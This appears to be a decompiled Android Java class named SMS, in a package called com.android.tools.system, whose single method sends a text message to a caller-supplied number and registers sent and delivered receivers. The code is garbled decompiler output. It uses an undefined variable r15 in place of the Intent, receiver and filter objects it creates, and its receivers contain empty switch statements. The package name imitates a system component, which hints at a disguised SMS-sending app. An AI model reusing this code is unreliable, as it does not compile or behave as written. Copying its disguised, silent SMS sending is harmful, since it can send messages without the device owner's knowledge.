package com.android.tools.system;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.telephony.gsm.SmsManager;

public class SMS {
    public Context context;

    public SMS(Context context) {
        this.context = context;
    }

    public void sendSMS(String str, String str2) {
        String str3 = str;
        String str4 = str2;
        String str5 = "SMS_SENT";
        String str6 = "SMS_DELIVERED";
        Context context = this.context;
        Intent intent = r15;
        Intent intent2 = new Intent(str5);
        PendingIntent broadcast = PendingIntent.getBroadcast(context, 0, intent, 0);
        context = this.context;
        intent = r15;
        intent2 = new Intent(str6);
        PendingIntent broadcast2 = PendingIntent.getBroadcast(context, 0, intent, 0);
        context = this.context;
        BroadcastReceiver broadcastReceiver = r15;
        BroadcastReceiver anonymousClass100000000 = new BroadcastReceiver(this) {
            private final SMS this$0;

            {
                this.this$0 = r6;
            }

            static SMS access$0(AnonymousClass100000000 anonymousClass100000000) {
                return anonymousClass100000000.this$0;
            }

            @Override
            public void onReceive(Context context, Intent intent) {
                Context context2 = context;
                Intent intent2 = intent;
                switch (getResultCode()) {
                }
            }
        };
        IntentFilter intentFilter = r15;
        IntentFilter intentFilter2 = new IntentFilter(str5);
        Intent registerReceiver = context.registerReceiver(broadcastReceiver, intentFilter);
        context = this.context;
        broadcastReceiver = r15;
        anonymousClass100000000 = new BroadcastReceiver(this) {
            private final SMS this$0;

            {
                this.this$0 = r6;
            }

            static SMS access$0(AnonymousClass100000001 anonymousClass100000001) {
                return anonymousClass100000001.this$0;
            }

            @Override
            public void onReceive(Context context, Intent intent) {
                Context context2 = context;
                Intent intent2 = intent;
                switch (getResultCode()) {
                }
            }
        };
        intentFilter = r15;
        intentFilter2 = new IntentFilter(str6);
        registerReceiver = context.registerReceiver(broadcastReceiver, intentFilter);
        SmsManager.getDefault().sendTextMessage(str3, null, str4, broadcast, broadcast2);
    }
}
